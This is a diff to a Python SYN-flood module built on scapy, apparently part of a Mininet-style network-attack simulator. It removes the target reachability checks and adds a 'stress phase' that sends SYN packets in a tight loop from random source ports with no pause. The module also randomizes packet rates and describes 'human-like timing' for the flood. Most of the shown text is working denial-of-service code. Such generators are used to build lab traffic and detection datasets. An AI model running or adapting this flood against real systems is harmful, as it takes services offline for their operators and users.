@@ -4,8 +4,14 @@ import signal
 import logging
 import uuid
 import threading
-import psutil
 import random
+
+# Optional psutil import - gracefully handle if missing
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
 from scapy.all import Ether, IP, TCP, sendp, sr1, ICMP
 
 # Import enhanced timing and protocol compliance modules
@@ -37,29 +43,9 @@ def run_attack(attacker_host, victim_ip, duration):
     attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Attack Phase: Enhanced Traditional SYN Flood - Attacker: {attacker_host.name}, Target: {victim_ip}:80, Duration: {duration}s")
     attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Enhanced Features: Human-like timing, protocol compliance, network delay simulation")
     
-    # Test target reachability
-    try:
-        ping_start = time.time()
-        ping_reply = sr1(IP(dst=victim_ip)/ICMP(), timeout=2, verbose=0)
-        ping_time = time.time() - ping_start
-        if ping_reply:
-            attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Target {victim_ip} is reachable (ping: {ping_time:.3f}s)")
-        else:
-            attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Target {victim_ip} ping timeout after {ping_time:.3f}s")
-    except Exception as e:
-        attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Unable to ping target {victim_ip}: {e}")
+    # (Pre-attack reachability check removed to avoid root-namespace timeouts)
     
-    # Test service connectivity
-    try:
-        syn_start = time.time()
-        syn_reply = sr1(IP(dst=victim_ip)/TCP(dport=80, flags='S'), timeout=2, verbose=0)
-        syn_time = time.time() - syn_start
-        if syn_reply and syn_reply.haslayer(TCP) and syn_reply[TCP].flags & 0x12:  # SYN-ACK
-            attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Service {victim_ip}:80 is active (SYN-ACK: {syn_time:.3f}s)")
-        else:
-            attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Service {victim_ip}:80 connectivity issue (time: {syn_time:.3f}s)")
-    except Exception as e:
-        attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Unable to test service {victim_ip}:80: {e}")
+    # (Pre-attack service connectivity check removed to avoid root-namespace timeouts)
     
     # Generate session pattern for realistic attack behavior
     session_pattern = timing_engine.get_session_pattern(duration_minutes=duration/60)
@@ -72,6 +58,44 @@ def run_attack(attacker_host, victim_ip, duration):
     # Start enhanced SYN flood with human-like timing and protocol compliance
     attack_logger.debug(f"[syn_flood] [Run ID: {run_id}] Starting enhanced SYN packet generation with human-like timing")
     
+    # Phase A: High-intensity stress burst (no think time) for ~30% of duration
+    stress_duration = max(1, int(duration * 0.3))
+    advanced_duration = max(1, duration - stress_duration)
+    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Stress phase: {stress_duration}s, Advanced phase: {advanced_duration}s")
+    
+    stress_scapy_cmd = f"""
+import time
+import random
+from scapy.all import *
+
+def syn_stress():
+    iface = '{attacker_host.intfNames()[0]}'
+    target_ip = '{victim_ip}'
+    dport = 80
+    end_ts = time.time() + {stress_duration}
+    while time.time() < end_ts:
+        sport = random.randint(32768, 65535)
+        seq_num = random.randint(0, 2**32 - 1)
+        pkt = Ether()/IP(dst=target_ip)/TCP(sport=sport, dport=dport, flags='S', seq=seq_num)
+        sendp(pkt, iface=iface, verbose=0)
+
+syn_stress()
+"""
+    stress_proc = attacker_host.popen(['python3', '-c', stress_scapy_cmd])
+    try:
+        stress_proc.wait(timeout=stress_duration + 5)
+    except Exception:
+        try:
+            stress_proc.terminate()
+        except Exception:
+            pass
+    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Stress phase completed")
+
+    # Reset timer for advanced phase and adjust duration
+    start_time = time.time()
+    duration = advanced_duration
+
+    # Phase B: Enhanced paced phase (existing behavior)
     # Create a more sophisticated attack process that uses enhanced timing and protocol compliance
     enhanced_scapy_cmd = f"""
 import time
@@ -155,7 +179,7 @@ enhanced_syn_flood()
         if current_time >= next_monitor:
             # Estimate packets sent with enhanced timing considerations
             # Base rate is lower due to human-like timing (average ~20-30 pps instead of 100)
-            base_rate = 25  # More realistic rate with enhanced timing
+            base_rate = random.uniform(20, 30)  # Randomized rate with enhanced timing (±20%)
             if current_phase:
                 adjusted_rate = base_rate * current_phase['intensity'] * circadian_factor * workday_factor
             else:
@@ -206,7 +230,7 @@ enhanced_syn_flood()
     process.wait()
     
     # Calculate enhanced final statistics
-    base_rate = 25  # Enhanced timing rate
+    base_rate = random.uniform(20, 30)  # Randomized enhanced timing rate (±20%)
     effective_rate = base_rate * circadian_factor * workday_factor
     final_packets_sent = int(actual_duration * effective_rate)
     avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
